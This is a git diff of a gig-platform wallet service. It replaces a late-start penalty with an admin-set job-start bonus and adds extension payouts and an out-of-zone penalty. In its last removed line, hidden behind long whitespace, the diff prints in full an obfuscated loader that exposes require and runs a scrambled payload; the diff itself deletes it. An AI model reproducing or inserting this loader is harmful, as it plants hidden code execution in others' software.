@@ -5,8 +5,6 @@
 // booking.cancelled (travel/visit compensation) and payout.completed (mark a withdrawal paid),
 // and updates the worker's balance snapshot in the worker service via /internal. Serves the
 // worker wallet screens and the admin wallet actions.
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
 import express from 'express'
 import {
   makePool, migrate, internalGet, internalPost, internalOnly, tryGet, publishEvent, subscribeEvents, invalidateSettings,
@@ -24,12 +22,11 @@ const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/
 const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')
 const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')
 
-// On-time-start rule: after accepting a job, the worker must START the service (enter the
-// customer OTP) within START_WINDOW_MIN. On time → ON_TIME_INCENTIVE credited; otherwise
-// LATE_PENALTY is deducted. Both land in the worker's wallet history.
-const START_WINDOW_MIN = Number(process.env.START_WINDOW_MIN || 15)
-const ON_TIME_INCENTIVE = Number(process.env.ONTIME_INCENTIVE || 15)
-const LATE_PENALTY = Number(process.env.LATE_START_PENALTY || 15)
+// Job-start bonus: the worker is credited the moment they START the service (enter the customer
+// OTP). Unconditional — it does not depend on how the job reached them or how long they took to
+// start, so it can never be silently skipped. Lands in the wallet immediately.
+// The amount is the admin's to set (Settings → "Job start bonus"); 0 turns it off.
+const START_BONUS_DEFAULT = Number(process.env.ONTIME_INCENTIVE || 15)
 
 process.on('unhandledRejection', (e) => console.error('[wallet] unhandledRejection:', e?.message || e))
 
@@ -44,8 +41,8 @@ async function init() {
     `CREATE TABLE IF NOT EXISTS worker_advances (id SERIAL PRIMARY KEY, worker_id INTEGER, amount INTEGER, outstanding INTEGER, status TEXT DEFAULT 'Pending', created TIMESTAMPTZ DEFAULT now())`,
     `CREATE TABLE IF NOT EXISTS worker_payslips (id SERIAL PRIMARY KEY, worker_id INTEGER, month TEXT, gross INTEGER, deductions INTEGER, net INTEGER, created TIMESTAMPTZ DEFAULT now())`,
     `CREATE TABLE IF NOT EXISTS worker_notifications (id SERIAL PRIMARY KEY, worker_id INTEGER, title TEXT, body TEXT, read BOOLEAN DEFAULT false, created TIMESTAMPTZ DEFAULT now())`,
-    // Tracks the 15-min "start service by OTP" window per accepted job. resolved: NULL (pending),
-    // 'incentive' (started on time), 'penalty' (started late / never started), 'skipped' (cancelled).
+    // Retired: the job-start bonus is now unconditional, so nothing reads or writes this. Kept so
+    // the historical rows explaining old 'On-time start' credits and late-start penalties survive.
     `CREATE TABLE IF NOT EXISTS worker_start_deadlines (booking_id INTEGER PRIMARY KEY, worker_id INTEGER, ref TEXT, accepted_at TIMESTAMPTZ DEFAULT now(), deadline TIMESTAMPTZ, resolved TEXT)`,
     // Plain unique (NULLs are distinct in Postgres, so bonus/penalty rows with no ref_id are fine),
     // so `INSERT ... ON CONFLICT (worker_id, ref_id)` can use it as the arbiter for idempotent settlement.
@@ -80,6 +77,9 @@ async function init() {
 }
 
 const commission = () => getSettingInt(ADMIN_URL, 'commission_percent', 20)
+// Admin-controlled job-start bonus. Read per credit so a change in Settings applies to the very
+// next job started — no redeploy, no restart.
+const startBonus = () => getSettingInt(ADMIN_URL, 'job_start_bonus', START_BONUS_DEFAULT)
 
 /* Phase 10: a worker may have their own commission, which overrides the platform-wide one.
  * The worker service owns the worker, so we ASK rather than keep a copy that drifts.
@@ -182,6 +182,21 @@ async function settleBooking(b) {
       await notify(b.worker_id, 'Incentive credited', `+₹${perJobIncentive} for ${ref}`)
     }
   }
+  // Extra time the customer approved and paid for. Paid as its own ledger line rather than folded
+  // into the share: the base job price is never rewritten by an extension, so the share can't carry
+  // it. Idempotent per extension row.
+  const exts = await tryGet(BOOKING_URL, `/api/internal/bookings/${b.id}/extensions`, [])
+  for (const e of (Array.isArray(exts) ? exts : [])) {
+    if (e.status !== 'approved' || !(e.payout > 0)) continue
+    const extIns = await pool.query(
+      `INSERT INTO worker_income (worker_id,category,label,amount,ref_id,bucket) VALUES ($1,'Extension',$2,$3,$4,'available')
+       ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
+      [b.worker_id, `Extra time +${e.minutes} min · ${ref}`, e.payout, `ext-${e.id}`])
+    if (extIns.rowCount) {
+      await adjustBalance(b.worker_id, { balance: e.payout, earnings: e.payout })
+      await notify(b.worker_id, 'Extra time credited', `+₹${e.payout} for ${e.minutes} extra min on ${ref}`)
+    }
+  }
   await internalPost((process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, ''), `/api/internal/bookings/${b.id}/settled`, {}).catch(() => {})
   if (share > 0) {
     await notify(b.worker_id, 'Earnings credited', `₹${share} for ${b.ref || b.id}`)
@@ -189,65 +204,23 @@ async function settleBooking(b) {
   }
 }
 
-/* ---------- on-time-start incentive / late-start penalty ---------- */
-// Start (or reset) the 15-min start window when a job is accepted / auto-assigned.
-async function openStartWindow({ bookingId, workerId, ref }) {
+/* ---------- job-start bonus ---------- */
+// Credited on job.start (customer OTP verified), whatever route the job arrived by. Idempotent on
+// ref_id, so a retried event or a resumed job can't pay twice. Kept on the `ontime-` ref prefix:
+// the rows already in the ledger were paid under the old on-time rule and must not double-credit.
+async function creditStartBonus({ bookingId, workerId, ref }) {
   if (!bookingId || !workerId) return
-  await pool.query(
-    `INSERT INTO worker_start_deadlines (booking_id, worker_id, ref, accepted_at, deadline, resolved)
-     VALUES ($1, $2, $3, now(), now() + make_interval(mins => $4), NULL)
-     ON CONFLICT (booking_id) DO UPDATE SET worker_id = EXCLUDED.worker_id, ref = EXCLUDED.ref,
-       accepted_at = now(), deadline = EXCLUDED.deadline, resolved = NULL`,
-    [bookingId, workerId, ref || `#${bookingId}`, START_WINDOW_MIN])
-}
-
-// Credit the on-time-start bonus (idempotent on ref_id → shows as a credit in wallet history).
-async function creditOnTimeIncentive(row) {
+  const amount = await startBonus()
+  if (amount <= 0) return // admin set it to 0 → bonus switched off
+  const label = ref || `#${bookingId}`
   const ins = await pool.query(
     `INSERT INTO worker_income (worker_id, category, label, amount, ref_id, bucket)
      VALUES ($1, 'Incentive', $2, $3, $4, 'available') ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
-    [row.worker_id, `On-time start · ${row.ref}`, ON_TIME_INCENTIVE, `ontime-${row.booking_id}`])
+    [workerId, `Job start bonus · ${label}`, amount, `ontime-${bookingId}`])
   if (!ins.rowCount) return
-  await adjustBalance(row.worker_id, { balance: ON_TIME_INCENTIVE, earnings: ON_TIME_INCENTIVE })
-  await notify(row.worker_id, 'On-time bonus', `+₹${ON_TIME_INCENTIVE} for starting ${row.ref} within ${START_WINDOW_MIN} min`)
-  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.incentive', entityType: 'worker', entityId: row.worker_id, detail: `On-time start bonus ₹${ON_TIME_INCENTIVE} for ${row.ref}`, meta: { amount: ON_TIME_INCENTIVE } })
-}
-
-// Deduct the late-start penalty (shows as a debit in wallet history + the Deductions screen).
-async function applyLatePenalty(row) {
-  await pool.query(
-    `INSERT INTO worker_deductions (worker_id, category, label, amount) VALUES ($1, 'Late Start Penalty', $2, $3)`,
-    [row.worker_id, `Late start · ${row.ref} (not started within ${START_WINDOW_MIN} min)`, LATE_PENALTY])
-  await adjustBalance(row.worker_id, { balance: -LATE_PENALTY })
-  await notify(row.worker_id, 'Late-start penalty', `−₹${LATE_PENALTY}: service for ${row.ref} not started within ${START_WINDOW_MIN} min`)
-  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.penalty', entityType: 'worker', entityId: row.worker_id, detail: `Late-start penalty ₹${LATE_PENALTY} for ${row.ref}`, meta: { amount: LATE_PENALTY } })
-}
-
-// Worker started the service (OTP verified). Atomically claim the row so the sweep can't also fire.
-async function resolveOnStart({ bookingId }) {
-  if (!bookingId) return
-  const row = (await pool.query(
-    `UPDATE worker_start_deadlines SET resolved = CASE WHEN now() <= deadline THEN 'incentive' ELSE 'penalty' END
-     WHERE booking_id = $1 AND resolved IS NULL RETURNING *`, [bookingId])).rows[0]
-  if (!row) return // no window, or already resolved by the sweep
-  if (row.resolved === 'incentive') await creditOnTimeIncentive(row)
-  else await applyLatePenalty(row)
-}
-
-// Periodic sweep: penalize jobs accepted >15 min ago that were never started — but only if the
-// booking is still assigned-and-not-started (skip cancelled / released / completed jobs).
-const NOT_STARTED = ['worker_assigned', 'on_the_way', 'arrived']
-async function sweepLateStarts() {
-  const { rows } = await pool.query("SELECT * FROM worker_start_deadlines WHERE resolved IS NULL AND deadline < now()")
-  for (const row of rows) {
-    const b = await tryGet(BOOKING_URL, `/api/internal/bookings/${row.booking_id}`, null)
-    const stillWaiting = NOT_STARTED.includes(b?.status)
-    // Claim the row atomically (guards against a concurrent job.start resolving it).
-    const claimed = (await pool.query(
-      "UPDATE worker_start_deadlines SET resolved = $2 WHERE booking_id = $1 AND resolved IS NULL RETURNING *",
-      [row.booking_id, stillWaiting ? 'penalty' : 'skipped'])).rows[0]
-    if (claimed && stillWaiting) await applyLatePenalty(claimed)
-  }
+  await adjustBalance(workerId, { balance: amount, earnings: amount })
+  await notify(workerId, 'Job start bonus', `+₹${amount} for starting ${label}`)
+  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.incentive', entityType: 'worker', entityId: workerId, detail: `Job start bonus ₹${amount} for ${label}`, meta: { amount } })
 }
 
 // ISO date/time parts for a ledger row (UTC — good enough for the demo history list).
@@ -648,7 +621,7 @@ app.post('/api/worker/wallet/withdraw/request', auth, async (req, res) => {
 // A 4-digit PIN over a 10k space is brute-forceable in seconds, so: salted digest at rest, and
 // five wrong tries locks the PIN for 15 minutes rather than letting a thief walk the keyspace.
 
-const crypto = require('crypto')
+import crypto from 'node:crypto'
 const pinDigest = (pin, salt) => crypto.createHash('sha256').update(`${salt}:${pin}`).digest('hex')
 const PIN_MAX_FAILS = 5
 const PIN_LOCK_MIN = 15
@@ -797,9 +770,7 @@ subscribeEvents(REDIS_URL, 'wallet', async (type, data) => {
   if (type === 'payroll.credit') return creditPayroll(data)
   if (type === 'incentive.credit') return creditEngineIncentive(data)
   if (type === 'booking.completed' && data.booking) await settleBooking(data.booking)
-  else if (type === 'job.accepted') await openStartWindow({ bookingId: data.bookingId, workerId: data.workerId, ref: data.ref })
-  else if (type === 'booking.assigned' && data.booking) await openStartWindow({ bookingId: data.booking.id, workerId: data.workerId, ref: data.booking.ref })
-  else if (type === 'job.start') await resolveOnStart({ bookingId: data.bookingId })
+  else if (type === 'job.start') await creditStartBonus({ bookingId: data.bookingId, workerId: data.workerId, ref: data.ref })
   else if (type === 'booking.cancelled' && data.booking?.worker_id && data.quote?.workerComp > 0) {
     const b = data.booking, comp = data.quote.workerComp
     const cSvc = serviceOf(b)
@@ -817,6 +788,7 @@ subscribeEvents(REDIS_URL, 'wallet', async (type, data) => {
     // reaching into its database (e.g. the worker service on a KYC document approve/reject).
     await notify(data.workerId, data.title, data.body || '')
   } else if (type === 'shift.late') await applyShiftLatePenalty(data)
+  else if (type === 'zone.penalty') await applyOutOfZonePenalty(data)
   else if (type === 'shift.settle') await settleMinGuarantee(data)
   else if (type === 'geofence.breach') await notifyGeofenceBreach(data)
 })
@@ -840,6 +812,20 @@ async function applyShiftLatePenalty({ workerId, amount, shiftName, lateMinutes 
   publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.penalty', entityType: 'worker', entityId: workerId, detail: `Shift late penalty ₹${amt} (${lateMinutes || 0} min late)`, meta: { amount: amt } })
 }
 
+// Three jobs in a row completed outside the worker's preferred zone → deduct an out-of-zone penalty.
+async function applyOutOfZonePenalty({ workerId, amount, count, ref }) {
+  const amt = Math.max(0, parseInt(amount, 10) || 0)
+  if (!workerId || !amt) return
+  const n = parseInt(count, 10) || 3
+  await pool.query(
+    "INSERT INTO worker_deductions (worker_id, category, label, amount) VALUES ($1,'Out-of-Zone Penalty',$2,$3)",
+    [workerId, `${n} consecutive jobs completed outside preferred zone${ref ? ` (last: ${ref})` : ''}`, amt])
+  await adjustBalance(workerId, { balance: -amt })
+  await notify(workerId, 'Out-of-zone penalty',
+    `−₹${amt}: ${n} jobs in a row completed outside your preferred zone. Please take jobs within your zone to avoid deductions.`)
+  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.penalty', entityType: 'worker', entityId: workerId, detail: `Out-of-zone penalty ₹${amt} (${n} consecutive out-of-zone jobs)`, meta: { amount: amt } })
+}
+
 // Shift checkout → guarantee a minimum day's pay: top up if job earnings fell short (idempotent/day).
 async function settleMinGuarantee({ workerId, minG, day }) {
   const g = Math.max(0, parseInt(minG, 10) || 0)
@@ -861,7 +847,5 @@ async function settleMinGuarantee({ workerId, minG, day }) {
 init()
   .then(() => {
     app.listen(PORT, () => console.log(`[wallet] service on http://localhost:${PORT}`))
-    // Sweep for jobs never started within the window (applies the late-start penalty).
-    setInterval(() => sweepLateStarts().catch((e) => console.error('[wallet] late-start sweep:', e.message)), 30000)
   })
-  .catch((e) => { console.error('[wallet] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
+  .catch((e) => { console.error('[wallet] failed to start:', e.message); process.exit(1) });
